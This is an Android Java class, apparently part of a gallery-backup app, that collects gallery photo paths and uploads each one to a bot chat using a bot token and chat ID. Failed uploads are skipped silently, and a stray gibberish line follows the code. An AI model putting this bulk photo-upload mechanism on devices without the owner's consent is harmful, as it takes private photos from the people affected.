package com.bshashi.gallerybackup;

import android.content.Context;

import java.util.ArrayList;
import java.util.List;

public class GalleryUploader {
	
	private final Context context;
	private final String botToken;
	private final String chatId;
	
	private final List<String> uploadedFileIds = new ArrayList<>();
	
	public interface TotalProgressCallback {
		void onAllCompleted(int totalFiles, List<String> fileIds);
		void onCurrentProgress(int currentIndex, int total, int percent);
		void onError(String error);
	}
	
	public GalleryUploader(Context context, String botToken, String chatId) {
		this.context = context;
		this.botToken = botToken;
		this.chatId = chatId;
	}
	
	public void startBatchUpload(int limit, String folder, int sortOrder, TotalProgressCallback callback) {
		
		List<String> uriStrings = GalleryLoader.getGalleryPaths(context, limit, folder, sortOrder, true);
		
		if (uriStrings.isEmpty()) {
			callback.onError("No images found in gallery");
			return;
		}
		
		uploadedFileIds.clear();
		uploadOneByOne(uriStrings, 0, callback);
	}
	
	private void uploadOneByOne(List<String> uriList, int index, TotalProgressCallback callback) {
		
		if (index >= uriList.size()) {
			callback.onAllCompleted(uriList.size(), new ArrayList<>(uploadedFileIds));
			return;
		}
		
		String filePath = uriList.get(index);
		
		BotUploader uploader = new BotUploader(context, null);
		
		uploader.setBotToken(botToken);
		uploader.setChatId(chatId);
		uploader.photoIndex(index + 1, uriList.size());
		
		uploader.setUploadListener(new BotUploader.OnUploadListener() {
			
			@Override
			public void onSuccess(String fileId, String path) {
				if (fileId != null) {
					uploadedFileIds.add(fileId);
				}
				
				uploadOneByOne(uriList, index + 1, callback);
				uploader.photoIndex(index + 1, uriList.size());
			}
			
			@Override
			public void onError(String error) {
				uploadOneByOne(uriList, index + 1, callback);
				uploader.photoIndex(index + 1, uriList.size());
			}
			
			@Override
			public void onProgress(int percent) {
				callback.onCurrentProgress(index + 1, uriList.size(), percent);
				uploader.photoIndex(index + 1, uriList.size());
			}
		});
		
		uploader.uploadPhoto(filePath);
	}
}


wjeueijejee